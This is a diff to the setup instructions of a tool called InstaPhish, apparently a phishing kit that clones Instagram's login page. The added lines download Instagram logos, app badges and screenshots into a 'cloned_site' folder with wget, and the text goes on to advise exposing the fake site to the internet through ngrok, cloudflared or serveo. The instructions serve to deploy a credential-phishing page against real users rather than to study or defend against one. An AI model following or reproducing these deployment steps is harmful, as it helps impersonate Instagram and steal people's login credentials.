@@ -33,6 +33,24 @@ pip3 install flask requests beautifulsoup4 cryptography pyOpenSSL
 
 # Start InstaPhish
 python3 instaphish.py
+cd ~/InstaPhish
+
+# Create a temp directory and clone just the images
+mkdir -p /tmp/insta_images
+
+# Download each image directly from your GitHub repo
+wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/facebook.png
+wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/google-play.png
+wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/insta_logo.png
+wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/microsoft.png
+wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/phones.png
+wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/ss1.png
+wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/ss2.png
+wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/ss3.png
+wget -P cloned_site/images/ https://raw.githubusercontent.com/r4tur1/InstaPhish/main/images/title.jpg
+
+# Verify
+ls -la cloned_site/images/
 ````
 
 > Use tools like ngrok, cloudflared, or serveo to expose to the internet.
